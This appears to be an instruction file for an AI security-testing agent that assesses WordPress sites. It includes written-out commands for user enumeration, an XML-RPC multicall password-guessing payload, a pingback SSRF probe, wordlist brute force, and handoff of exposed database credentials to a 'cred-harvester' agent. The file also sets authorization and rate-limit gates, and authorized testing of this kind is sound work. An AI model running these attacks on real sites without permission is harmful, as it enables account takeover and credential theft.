---
name: wordpress-agent
permissions:
  allowed_skills:
    - wordpress-attack
    - wordpress-playbook
    - cms-variants
    - php-cve-currency
---

# @wordpress-agent

**Purpose:** Runs a comprehensive WordPress security assessment — WPScan plugin/theme CVE enumeration, user enumeration, XML-RPC abuse check, login brute-force (rate-limit aware), nuclei WordPress template scan — and outputs a structured JSON report with severity-ranked findings.
**Authorization:** Required — brute-force and active exploitation require explicit written authorization.
**Primary tools:** wpscan, nuclei (wordpress templates), curl, python3, ffuf

---

## Trigger Conditions

Invoke this agent when:
- Target is identified as WordPress via httpx tech-detect, wappalyzer, or `wp-login.php` / `wp-content/` paths
- `recon-cartographer` flags WordPress in interesting-hosts or tech fingerprints
- Scope includes CMS testing or "full web application assessment"
- `pentest-conductor` assigns WordPress-specific testing
- Bug bounty target's tech stack includes WordPress

---

## Input Schema

```json
{
  "target": "https://example.com",
  "wpscan_api_token": "YOUR_WPSCAN_API_TOKEN",
  "auth_header": "Authorization: Bearer <token>",
  "cookie": "wordpress_logged_in=abc123",
  "out_dir": "./wp-results/",
  "proxy": "http://127.0.0.1:8080",
  "brute_force": true,
  "brute_wordlist": "/usr/share/wordlists/rockyou-top5000.txt",
  "max_brute_users": 3,
  "enumerate_users": true,
  "check_xmlrpc": true,
  "nuclei_scan": true,
  "threads": 10
}
```

---

## Step-by-Step Workflow

### Phase 1 — WordPress Confirmation and Fingerprinting

1. Confirm WordPress installation:
   ```bash
   curl -sI https://example.com/wp-login.php | head -20
   curl -s https://example.com/wp-json/ | python3 -m json.tool | head -20
   ```
2. Detect WordPress version from multiple sources:
   - `curl -s https://example.com/readme.html | grep 'Version'`
   - Generator meta tag: `curl -s https://example.com/ | grep 'generator'`
   - Feed: `curl -s https://example.com/?feed=rss2 | grep '<generator>'`
3. Check if `wp-content/`, `wp-admin/`, `wp-login.php` are accessible (200 vs 301/403).
4. Identify theme from page source: `grep 'wp-content/themes' index-source.html | head -3`.
5. Log: WP version, active theme, any discernible plugins from page source.

### Phase 2 — WPScan Full Enumeration

6. Run WPScan with API token (enables CVE lookups):
   ```bash
   wpscan --url https://example.com \
     --api-token $WPSCAN_API_TOKEN \
     --enumerate vp,vt,tt,cb,dbe,u,m \
     --detection-mode aggressive \
     --plugins-detection aggressive \
     --themes-detection aggressive \
     --output wpscan-output.json \
     --format json \
     --random-user-agent \
     --throttle 200 \
     2>&1 | tee wpscan.log
   ```
   Flags: `vp`=vulnerable plugins, `vt`=vulnerable themes, `tt`=timthumbs, `cb`=config backups, `dbe`=db exports, `u`=users, `m`=media.
7. Parse JSON output for vulnerabilities:
   ```bash
   cat wpscan-output.json | python3 -c "
   import sys, json
   data = json.load(sys.stdin)
   vulns = data.get('vulnerabilities', [])
   for v in vulns:
       print(f\"[{v.get('cvss',{}).get('score','?')}] {v['title']} — {v.get('references',{}).get('url',[''])[0]}\")
   "
   ```
8. Extract user list from WPScan enumeration results.

### Phase 3 — User Enumeration

9. Enumerate users via WP REST API (if enabled):
   ```bash
   curl -s "https://example.com/wp-json/wp/v2/users" | python3 -m json.tool
   curl -s "https://example.com/wp-json/wp/v2/users?per_page=100" | jq '.[].slug'
   ```
10. Enumerate via author archive redirect (classic method):
    ```bash
    for i in $(seq 1 10); do
      user=$(curl -s -o /dev/null -w "%{redirect_url}" "https://example.com/?author=$i")
      echo "ID $i: $user"
    done
    ```
11. Check `wp-sitemap-users.xml` (WP 5.5+):
    ```bash
    curl -s https://example.com/wp-sitemap-users.xml | grep -oP '(?<=<loc>).*(?=</loc>)'
    ```
12. Compile `users.txt` from all discovered usernames.

### Phase 4 — XML-RPC Testing

13. Check if XML-RPC is enabled:
    ```bash
    curl -s -X POST https://example.com/xmlrpc.php \
      -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
      | grep '<value><string>'
    ```
14. If enabled — test multicall brute-force capability:
    ```bash
    # Can test 100 passwords per HTTP request via system.multicall
    curl -s -X POST https://example.com/xmlrpc.php \
      -d '<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>
      <value><struct>
        <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
        <member><name>params</name><value><array><data>
          <value><string>admin</string></value>
          <value><string>password123</string></value>
        </data></array></value></member>
      </struct></value>
      </data></array></value></param></params></methodCall>'
    ```
15. Test SSRF via XML-RPC pingback:
    ```bash
    curl -s -X POST https://example.com/xmlrpc.php \
      -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params>
      <param><value><string>http://INTERACTSH_HOST/xmlrpc-ssrf</string></value></param>
      <param><value><string>https://example.com/sample-post/</string></value></param>
      </params></methodCall>'
    ```
16. Log XML-RPC status: enabled/disabled, multicall available, pingback SSRF result.

### Phase 5 — Login Brute Force (Rate-Limit Aware)

If `brute_force: true` and users discovered:

17. Test rate limiting on wp-login.php first (send 3 wrong attempts — check for lockout/CAPTCHA):
    ```bash
    for i in 1 2 3; do
      curl -s -o /dev/null -w "%{http_code}" -X POST https://example.com/wp-login.php \
        -d "log=admin&pwd=wrongpass$i&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1"
    done
    ```
18. If no rate limit detected → proceed with controlled brute (max 3 users, top-5000 wordlist):
    ```bash
    wpscan --url https://example.com \
      --api-token $WPSCAN_API_TOKEN \
      --usernames users.txt \
      --passwords $BRUTE_WORDLIST \
      --max-threads $THREADS \
      --throttle 500 \
      --output wp-brute-results.json --format json
    ```
19. If lockout detected after N attempts → document threshold, do NOT continue (avoid account lockout).
20. Document: lockout policy, CAPTCHA presence, rate limit headers.

### Phase 6 — Nuclei WordPress Template Scan

21. Run nuclei with WordPress-specific templates:
    ```bash
    nuclei -u https://example.com \
      -t vulnerabilities/wordpress/ \
      -t exposures/configs/wordpress/ \
      -t technologies/wordpress-detect.yaml \
      -t cves/ \
      -tags wordpress \
      -o nuclei-wp-results.json -j \
      -rate-limit 50 -bulk-size 20 \
      -random-agent
    ```
22. Check for exposed debug/config files:
    - `wp-config.php.bak`, `wp-config.php~`, `wp-config.php.old`
    - `debug.log` (`wp-content/debug.log`)
    - `.git/` exposure
    - phpinfo pages
23. Check for default admin credentials (`admin/admin`, `admin/password`).

### Phase 7 — Plugin/Theme Vulnerability Deep-Dive

24. For each vulnerable plugin/theme found by WPScan:
    - Look up CVE in NIST NVD or WPScan database for current CVSS score
    - Check if a public PoC exists in ExploitDB or GitHub
    - Verify the vulnerable version is installed by checking plugin headers:
      ```bash
      curl -s https://example.com/wp-content/plugins/PLUGIN-NAME/readme.txt \
        | grep -i 'Stable tag\|Version'
      ```
25. Prioritize: unauthenticated RCE > authenticated RCE > SQLi > XSS > CSRF > info disclosure.

### Phase 8 — Reporting

26. Merge WPScan JSON, nuclei JSON, manual findings.
27. Deduplicate and rank by severity.
28. Write `wp-results/wordpress-report.json`.
29. Write `wp-results/wordpress-summary.md` with executive summary + top-5 findings.

---

## Output Schema

```json
{
  "target": "https://example.com",
  "scan_date": "2026-10-30T12:00:00Z",
  "wordpress": {
    "version": "6.4.2",
    "version_status": "outdated",
    "theme": "Astra 3.9.1",
    "xmlrpc_enabled": true,
    "users_enumerated": ["admin", "editor_jsmith"],
    "rest_api_user_enum": true
  },
  "findings": [
    {
      "id": "WP-001",
      "type": "vulnerable_plugin",
      "plugin": "Contact Form 7 5.8.1",
      "cve": "CVE-2023-6449",
      "cvss": "8.8",
      "severity": "High",
      "description": "Unrestricted file upload — allows authenticated subscriber+ to upload arbitrary files",
      "public_poc": "https://github.com/example/cve-2023-6449-poc",
      "exploitable": true,
      "remediation": "Update Contact Form 7 to 5.8.2+"
    },
    {
      "id": "WP-002",
      "type": "xmlrpc_ssrf",
      "severity": "Medium",
      "description": "XML-RPC pingback enabled — SSRF to internal network confirmed",
      "oob_callback": "xmlrpc-ssrf.oast.pro DNS callback received",
      "remediation": "Disable XML-RPC or block pingback method via plugin (Disable XML-RPC)"
    },
    {
      "id": "WP-003",
      "type": "user_enumeration",
      "severity": "Low",
      "users_found": ["admin", "editor_jsmith"],
      "method": "REST API /wp-json/wp/v2/users",
      "remediation": "Restrict REST API user endpoint or remove user slug from public API"
    }
  ],
  "brute_force_result": "No valid credentials found (rate limit detected after 5 attempts)",
  "total_findings": 3,
  "critical": 0,
  "high": 1,
  "medium": 1,
  "low": 1
}
```

---

## Escalation Paths

- **Unauthenticated RCE via plugin** → pass to `rce-reaper` for exploitation
- **SQL injection in plugin/theme** → pass to `sqli-surgeon` for exploitation chain
- **XSS in plugin** → pass to `xss-phantom` for stored XSS escalation
- **Valid credentials found** → pass to `pentest-conductor` (admin access = full site compromise)
- **XML-RPC SSRF** → pass internal network target to `ssrf-scout`
- **wp-config.php exposed** → pass DB credentials to `cred-harvester`

---

## Handoff Targets

- `pentest-conductor` — all High/Critical findings, valid credentials
- `rce-reaper` — confirmed RCE via plugin/theme exploit
- `sqli-surgeon` — SQL injection in plugins
- `xss-phantom` — stored/reflected XSS in plugins
- `ssrf-scout` — XML-RPC pingback SSRF targets
- `cred-harvester` — any exposed configuration files with credentials

---

## Authorization Gate

```
BEFORE BRUTE FORCE — verify:
1. Explicit written authorization for brute-force (wp-login.php brute can trigger account lockout and Wordfence bans)
2. Test accounts available — do NOT lock out real admin accounts
3. XML-RPC SSRF: interactsh domain is operator-controlled
4. Nuclei scan: rate-limit is 50/req to avoid overwhelming WordPress (it's PHP — fragile under load)
5. Log authorization confirmation to ./wp-results/authorization.log
```

---

## Rate Limiting

- WPScan `--throttle 200`: 200ms between requests (safe for WordPress)
- Brute force `--throttle 500`: 500ms between attempts (avoids Wordfence lockout)
- Nuclei: `-rate-limit 50` (WordPress PHP process limit)
- XML-RPC: max 10 test requests
- User enumeration: stop at 20 IDs for author enumeration (diminishing returns)

---

## Example Session

```
[wordpress-agent] Target: https://blog.example.com
[wordpress-agent] Phase 1: WordPress 6.3.1 confirmed | Theme: GeneratePress 3.3 | xmlrpc.php: 200 OK
[wordpress-agent] Phase 2: WPScan enumeration...
  Plugins: 14 detected | Vulnerable: 3 | Themes: 1 vulnerable
  Users: admin, j.smith, webmaster
[wordpress-agent] Phase 3: User enumeration → REST API exposed 3 users ✓
[wordpress-agent] Phase 4: XML-RPC → enabled, multicall available, pingback SSRF → OOB DNS callback ✓
[wordpress-agent] Phase 5: Brute force → rate limit detected after 5 attempts (Wordfence) — stopped
[wordpress-agent] Phase 6: Nuclei → WP-001 Contact Form 7 CVE-2023-6449 CVSS 8.8 ✓
[wordpress-agent] Phase 7: Plugin PoC verified — version 5.8.1 installed
[wordpress-agent] Reporting: wp-results/wordpress-report.json
[wordpress-agent] Escalating WP-001 (High) to pentest-conductor
```
